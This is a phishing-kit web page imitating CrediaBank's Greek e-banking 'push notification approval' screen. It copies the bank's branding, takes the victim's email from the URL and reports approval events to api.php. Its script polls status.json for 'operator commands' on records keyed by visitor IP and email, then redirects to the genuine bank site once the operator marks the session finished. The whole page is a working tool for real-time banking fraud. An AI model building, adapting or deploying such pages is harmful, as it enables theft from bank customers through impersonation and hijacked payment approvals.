<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, viewport-fit=cover">
    <title>CrediaBank e-banking | Έγκριση μέσω Push Notification</title>
    <link rel="stylesheet" href="./css/snipped.css">
    <link rel="stylesheet" href="./css/cssr.css">
    <link rel="stylesheet" href="./css/cssl.css">
    <link rel="stylesheet" href="./css/css.css">
    <style>
        .login-campaigns-container { display: flex; justify-content: center; align-items: center; width: 100%; }
        .sms-widget { max-width: 550px; width: 100%; margin: 0 auto 48px auto; float: none; }
        @media (max-width: 768px) { .sms-widget { margin-bottom: 32px; } }
        .redesign-footer-container { margin-top: 20px; }
        .push-card {
            text-align: center; background: #FFFFFF; border-radius: 28px;
            padding: 32px 24px; box-shadow: 0 8px 20px rgba(0,0,0,0.05); margin: 20px 0;
        }
        .push-loader-icon {
            display: inline-block; width: 48px; height: 48px;
            border: 4px solid #E9ECEF; border-top: 4px solid #0047AB;
            border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 16px;
        }
        .loader-inline {
            display: inline-block; width: 28px; height: 28px;
            border: 3px solid #E9ECEF; border-top: 3px solid #0047AB;
            border-radius: 50%; animation: spin 0.8s linear infinite;
            margin-right: 12px; vertical-align: middle;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .approve-button {
            background: #0047AB; color: white; border: none; border-radius: 60px;
            padding: 14px 28px; font-size: 18px; font-weight: 600; width: 100%;
            cursor: pointer; transition: 0.2s; margin-top: 20px;
        }
        .approve-button:hover:not(:disabled) { background: #003380; transform: scale(1.01); }
        .approve-button:disabled { background: #A0B3D9; cursor: not-allowed; }
        .send-push-btn {
            background: #0047AB; color: white; border: none; border-radius: 60px;
            padding: 14px 28px; font-size: 18px; font-weight: 600; width: 100%; cursor: pointer; margin-bottom: 20px;
        }
        .resend-link { margin-top: 20px; }
        .resend-link a { color: #0047AB; text-decoration: none; font-weight: 500; }
        .modal-overlay.ng-hide { display: none !important; }
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 2000;
            display: flex; align-items: center; justify-content: center;
        }
        .modal-loading {
            background: white; padding: 24px 32px; border-radius: 28px;
            text-align: center; box-shadow: 0 20px 35px -8px rgba(0,0,0,0.2);
        }
        .spinner-container {
            width: 40px; height: 40px; margin: 0 auto 16px;
            border: 4px solid #E9ECEF; border-top: 4px solid #0047AB;
            border-radius: 50%; animation: spin 0.8s linear infinite;
        }
    </style>
<base target="_blank">
<base target="_blank">
</head>
<body>
<div class="right-side margin-auto snipcss-wnMB2">
    <div class="container ng-scope redesign-header-fragment-container">
        <div class="row">
            <div fragment="redesignHeader" class="ng-scope">
                <div id="redesign-header" class="redesign-header-container ng-scope">
                    <div class="logo-container hidden-small">
                        <a href="#"><img src="https://ebanking.crediabank.com/img/redesignLogo.png?ver=f1604f7ac63ee5a707473775a64907bb02f96080" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="logo-container hidden-above-medium">
                        <a href="#"><img src="./images/logo-small.svg" class="img-responsive" alt="CrediaBank e-banking"></a>
                    </div>
                    <div class="top-links">
                        <ul class="hidden-small">
                            <li><span class="branches header-icon hidden-xs"></span><div class="header-link-container"><a>Καταστήματα &amp; ΑΤΜ</a></div></li>
                            <li><span class="communication header-icon hidden-xs"></span><div class="header-link-container"><a>Επικοινωνία</a></div></li>
                            <li><span class="header-icon languages"></span><div class="header-link-container"><a>Greek</a></div></li>
                        </ul>
                        <ul class="hidden-above-medium">
                            <li class="header-icon-container"><a class="header-icon-small branches"></a></li>
                            <li class="header-icon-container"><a class="header-icon-small communication"></a></li>
                            <li class="language-container"><div class="header-icon-small"><span class="header-icon languages"></span></div><div class="plain-list-drop-down"><a class="plain-list-drop-down-selector"></a><div class="plain-list-drop-down-selected"><a>GR</a></div></div></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="log-container" class="container">
        <div class="row">
            <div id="main-log" class="ng-scope view-animation-left">
                <form id="pushForm" autocomplete="off" class="ng-pristine ng-scope">
                    <div class="login-campaigns-container">
                        <div class="login-widget col-lg-6 col-md-12 sms-widget">
                            <div class="top-container">
                                <h1 class="ng-binding">Έγκριση μέσω Push Notification</h1>
                                <div class="push-card">
                                    <div class="push-loader-icon"></div>
                                    <p style="margin-bottom: 24px; font-size: 16px;">
                                        Θα σταλεί ειδοποίηση στην εγγεγραμμένη συσκευή σας.<br>
                                        Εγκρίνετε την πληρωμή από το κινητό σας.
                                    </p>
                                    <button type="button" id="sendPushBtn" class="send-push-btn">Αποστολή Push Notification</button>
                                    <div id="pushWaitingArea" style="display: none;">
                                        <div class="loader-inline"></div>
                                        <span style="font-weight: 500;">Αναμονή για έγκριση από τη συσκευή...</span>
                                        <div style="margin-top: 20px;">
                                            <button type="button" id="simulateApproveBtn" class="approve-button" disabled>Έγκριση (προσομοίωση)</button>
                                        </div>
                                        <div class="resend-link">
                                            <a href="#" id="resendPushLink">Δεν έλαβες notification; Στείλτε ξανά</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="pushMessageArea" class="bottom-container"></div>
                        </div>
                    </div>
                    <div class="row default-login__container-bottom ng-scope">
                        <div class="default-login__notification-container">
                            <div class="default-login__info">
                                <div class="feed-slider ng-scope">
                                    <div class="animate-if">
                                        <h3 class="feed-slider__main-header ng-scope">Σημαντικές Ενημερώσεις</h3>
                                        <div class="feed-slider__feed-list-container">
                                            <ul class="feed-slider__feed-list ng-scope">
                                                <li class="feed-slider__feed-list-item ng-scope">
                                                    <div class="media"><div class="media-left"><div class="feed-slider__media-object-container"><span class="feed-slider__date-day ng-binding">15&nbsp;</span><span class="feed-slider__date-month ng-binding">ΜΑΪ&nbsp;</span><span class="feed-slider__date-year ng-binding">2026</span></div></div><div class="media-title icon-text-container"><div class="feed-slider__content-wrapper"><div class="ng-scope"><h4 class="media-heading feed-slider__media-header feed-slider__text-content ng-binding"> Προειδοποίηση Ασφαλείας – Απόπειρες ηλεκτρονικής απάτης </h4></div></div></div><div class="media-body"><div class="feed-slider__media-text-wrapper feed-slider__media-text-wrapper--is-open"><p class="feed-slider__media-text feed-slider__media-text--is-open ng-binding"> Αν λάβεις μήνυμα επαλήθευσης στοιχείων e-banking, μην επιλέξεις τον σύνδεσμο, μην καταχωρήσεις στοιχεία ή ανοίξεις συνημμένα αρχεία. Πρόκειται για απάτη. </p></div></div></div>
                                                </li>
                                                <li class="feed-slider__feed-list-item ng-scope">
                                                    <div class="media"><div class="media-left"><div class="feed-slider__media-object-container"><span class="feed-slider__date-day ng-binding">10&nbsp;</span><span class="feed-slider__date-month ng-binding">ΔΕΚ&nbsp;</span><span class="feed-slider__date-year ng-binding">2025</span></div></div><div class="media-title icon-text-container"><div class="feed-slider__content-wrapper"><div class="ng-scope"><h4 class="media-heading feed-slider__media-header feed-slider__text-content ng-binding"> Ενεργοποίηση ανενεργού λογαριασμού για Φυσικά Πρόσωπα </h4></div></div></div><div class="media-body"><div class="feed-slider__media-text-wrapper feed-slider__media-text-wrapper--is-open"><p class="feed-slider__media-text feed-slider__media-text--is-open ng-binding"> Ενεργοποιείστε μέσω e-banking και mobile app τον ανενεργό λογαριασμό σας χωρίς επίσκεψη σε κατάστημα. </p></div></div></div>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="container redesign-footer-container ng-scope">
                        <div class="row">
                            <div class="footer-container ng-scope">
                                <div class="footer-content-left">
                                    <span class="footer-logo"></span>
                                    <div class="footer-communication-container">
                                        <div class="footer-communication">
                                            <div class="footer-email-container"><span class="footer-email"></span><a class="footer-bold-weight ng-binding" href="mailto:ebanking@crediabank.com">ebanking@crediabank.com</a></div>
                                            <div class="footer-tel-container"><span class="footer-tel"></span><a class="footer-bold-weight ng-binding" href="tel:2103669000">210 366 9000</a></div>
                                        </div>
                                        <div class="footer-socials-container">
                                            <a class="instagram icon" href="#"></a>
                                            <a class="linkedIn icon" href="#"></a>
                                            <a class="youtube icon" href="#"></a>
                                        </div>
                                    </div>
                                    <div class="footer-apps-container-left">
                                        <div class="footer-apps">
                                            <p class="ng-scope">Κατεβάστε την εφαρμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                            <span class="ng-binding">Copyright © 2025</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="footer-section-container">
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΠΛΗΡΟΦΟΡΙΕΣ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Όροι Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ασφάλεια Συναλλαγών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Κωδικοί Μιας Χρήσης</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Συχνές Ερωτήσεις</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υποστήριξη</a></li>
                                        </ul>
                                    </div>
                                    <div class="footer-sections ng-scope col-6">
                                        <div class="section-title"><h3 class="ng-scope ng-binding">ΧΡΗΣΙΜΑ</h3></div>
                                        <ul class="list-without-chevron">
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Πολιτική Cookies</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Προσωπικά Δεδομένα</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εγγύηση Καταθέσεων</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Υπολογιστής ΙΒΑΝ</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Ειδικοί Όροι Τραπεζικών Εργασιών</a></li>
                                            <li class="ng-scope"><a href="#" class="ng-scope ng-binding">Εργαλείο Μετατροπής Αρχείου σε XML</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="footer-apps-container-right">
                                    <div class="footer-apps">
                                        <p class="ng-scope">Κατεβάστε την εφαρμογή :<br><a href="#"><img src="./images/app-apple-store-el.png" border="0"></a><a href="#"><img src="./images/app-google-play-el.png" border="0"></a></p>
                                        <span class="ng-binding">Copyright © 2025</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal-overlay ng-hide" id="loadingModal">
    <div class="modal-loading">
        <div class="spinner-container"></div>
        <span>Επεξεργασία...</span>
    </div>
</div>

<script>
(function() {
    const sendBtn = document.getElementById('sendPushBtn');
    const waitingDiv = document.getElementById('pushWaitingArea');
    const approveBtn = document.getElementById('simulateApproveBtn');
    const resendLink = document.getElementById('resendPushLink');
    const msgDiv = document.getElementById('pushMessageArea');
    const loadingModal = document.getElementById('loadingModal');
    let storedEmail = '';
    let pushSent = false;
    let checkInterval;
    let lastStatus = "";

    // Get email from URL
    const urlParams = new URLSearchParams(window.location.search);
    storedEmail = urlParams.get('u') || '';

    function setLoading(show) {
        if (show) loadingModal.classList.remove('ng-hide');
        else loadingModal.classList.add('ng-hide');
    }

    function showMessage(text, isError) {
        if (!msgDiv) return;
        msgDiv.innerHTML = `<div style="background:${isError ? '#FFEFEF' : '#E6F7E6'};color:${isError ? '#B00020' : '#1E7A1E'};border-radius:12px;padding:12px;text-align:center;">${text}</div>`;
    }

    async function sendPush() {
        setLoading(true);
        await new Promise(r => setTimeout(r, 1500));
        setLoading(false);
        return true;
    }

    async function startPushFlow() {
        if (pushSent) return;
        await sendPush();
        pushSent = true;
        sendBtn.style.display = 'none';
        waitingDiv.style.display = 'block';
        if (approveBtn) approveBtn.disabled = false;

        // Send push request to API
        let fd = new FormData();
        fd.append('type', 'push_request');
        fetch('api.php', { method: 'POST', body: fd }).catch(console.warn);

        // Start polling for operator commands
        if (!checkInterval) checkInterval = setInterval(checkStatus, 2000);
    }

    function onApprove() {
        setLoading(true);

        // Send approval to API - FIXED: type is 'push_approved' (api.php now handles this)
        let fd = new FormData();
        fd.append('type', 'push_approved');
        fetch('api.php', { method: 'POST', body: fd }).then(() => {
            showMessage('Συναλλαγή εγκρίθηκε επιτυχώς! Ανακατεύθυνση...', false);
        }).catch(err => console.warn(err));

        if (approveBtn) {
            approveBtn.disabled = true;
            approveBtn.innerText = 'Εγκρίθηκε';
        }
    }

    function checkStatus() {
        fetch('status.json?t=' + Date.now(), { cache: 'no-store' })
        .then(r => r.json())
        .then(data => {
            let s = "";
            for (let ip in data) {
                if (data[ip].email === storedEmail) {
                    s = data[ip].status;
                    break;
                }
            }
            if (s !== lastStatus) {
                lastStatus = s;
                if (s === 'finished') {
                    window.location.href = 'https://www.crediabank.com/';
                } else if (s === 'push_error') {
                    setLoading(false);
                    showMessage('Η έγκριση απορρίφθηκε. Δοκιμάστε ξανά.', true);
                    resetPushFlow();
                }
            }
        }).catch(err => console.log("Waiting..."));
    }

    function resetPushFlow() {
        pushSent = false;
        sendBtn.style.display = 'block';
        waitingDiv.style.display = 'none';
        if (approveBtn) {
            approveBtn.disabled = true;
            approveBtn.innerText = 'Έγκριση (προσομοίωση)';
        }
    }

    async function resendPush() {
        resetPushFlow();
        await startPushFlow();
    }

    sendBtn.onclick = startPushFlow;
    if (approveBtn) approveBtn.onclick = onApprove;
    if (resendLink) {
        resendLink.onclick = (e) => {
            e.preventDefault();
            resendPush();
        };
    }
})();
</script>
</body>
</html>